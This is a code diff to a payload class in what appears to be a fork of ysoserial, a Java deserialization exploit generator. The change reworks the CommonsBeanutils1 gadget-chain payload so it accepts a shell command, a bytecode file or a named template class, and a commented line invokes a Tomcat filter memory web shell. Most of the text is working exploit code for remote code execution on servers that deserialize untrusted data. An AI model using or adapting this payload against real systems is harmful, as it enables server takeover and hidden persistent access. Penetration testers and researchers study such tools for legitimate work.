@@ -1,14 +1,14 @@
 package ysoserial.payloads;
 
 import org.apache.commons.beanutils.BeanComparator;
-import ysoserial.Serializer;
+import org.apache.wicket.util.file.Files;
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.Gadgets;
+import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
 
 import java.io.File;
-import java.io.FileOutputStream;
 import java.util.PriorityQueue;
 
 @SuppressWarnings({"rawtypes", "unchecked"})
@@ -17,33 +17,33 @@ import java.util.PriorityQueue;
 public class CommonsBeanutils1NOCC implements ObjectPayload<Object> {
 
     public static void main(final String[] args) throws Exception {
-//        PayloadRunner.run(CommonsBeanutils1NOCC.class, args);
-        Object object = CommonsBeanutils1NOCC.class.newInstance().getObject("");
-        byte[] serialize = Serializer.serialize(object);
+        PayloadRunner.run(CommonsBeanutils1NOCC.class, args);
 
-        File file = new File("/tmp/serial.ser");
-        if (file.exists()) file.delete();
-
-        FileOutputStream fileOutputStream = new FileOutputStream(file);
-        fileOutputStream.write(serialize);
-        fileOutputStream.flush();
-        fileOutputStream.close();
-        System.out.println("/tmp/serial.ser");
-
-//        String encode = Base64.encodeBase64String(serialize);
-//        System.out.println(encode);
+//        Object object = new CommonsBeanutils1NOCC().getObject("CLASS:TomcatFilterMemShell");
+//        File file = new File("e:\\ser.ser");
+//        if (file.exists()) file.delete();
+//        Serializer.serialize(object, new FileOutputStream(file));
     }
 
     public Object getObject(final String command) throws Exception {
         final Object template;
-        if (command.startsWith("CLASS:")) {
-            Class<?> aClass = Class.forName("ysoserial.payloads.shells." + command.substring(6));
-            template = Gadgets.createTemplatesImpl(aClass);
-        } else {
-            template = Gadgets.createTemplatesImpl(command);
+        Class<?> clazz;
+        try {
+            if (command.startsWith("CLASS:")) {
+                clazz = Class.forName("ysoserial.payloads.templates." + command.substring(6));
+                template = Gadgets.createTemplatesImpl(clazz);
+            } else if (command.startsWith("FILE:")) {
+                byte[] bytes = Files.readBytes(new File(command.substring(5)));
+                template = Gadgets.createTemplatesImpl(bytes);
+            } else if (command.startsWith("CMD:")) {
+                template = Gadgets.createTemplatesImpl(command.substring(4));
+            } else {
+                throw new UnsupportedOperationException("参数语法不支持,请看readme.");
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+            return 0;
         }
-
-//        final Object templates1 = Gadgets.createTemplatesImpl(Runtime.class);
         // mock method name until armed
         final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
 
